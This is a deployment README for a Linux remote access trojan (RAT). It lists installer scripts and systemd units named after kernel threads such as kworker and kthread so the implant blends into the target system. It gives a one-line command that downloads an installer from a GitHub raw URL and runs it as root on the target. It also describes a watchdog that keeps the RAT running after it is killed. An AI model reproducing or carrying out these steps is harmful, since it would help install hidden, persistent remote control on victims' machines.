Spark Linux Deploy Assets
=========================

Files in deploy/:
  install_rat.sh          - RAT one-click installer (upload to kworker GitHub repo root)
  kthread.service         - systemd unit for RAT client
  kthread-watch.sh        - loop watchdog script
  kthread-watch.service   - systemd fallback when cron is unavailable
  pack-kworker-tar.sh     - build kworker.tar.gz for GitHub
  kthread                 - Web UI generated client (NOT built/linux_amd64 template)

Prepare kthread (required before pack-kworker-tar.sh):
  1. Start server (run.bat) and open Web UI
  2. Generate Linux client -> download kthread
  3. Save to deploy/kthread
  built/linux_amd64 is a blank template; Web UI injects server config into it.

One-click install on target Linux (root):
  bash -c "$(curl -fsSL https://raw.githubusercontent.com/wondream322/kworker/master/install_rat.sh)"

Local test:
  bash deploy/install_rat.sh

Build kworker.tar.gz (Linux/WSL):
  bash deploy/pack-kworker-tar.sh

Package layout (tar root):
  kworker, kworker.sh, c, kworker.service (legacy, not installed)
  kthread, kthread.service, kthread-watch.sh, kthread-watch.service

After install:
  /var/local/kworker/     - kworker files (permissions only, no kworker.service)
  /var/local/kthreadd/    - kthread binary + watch.sh
  systemctl status kthread.service

Test auto-recovery:
  pkill -f "kthread --service-worker"
  sleep 5
  systemctl status kthread.service
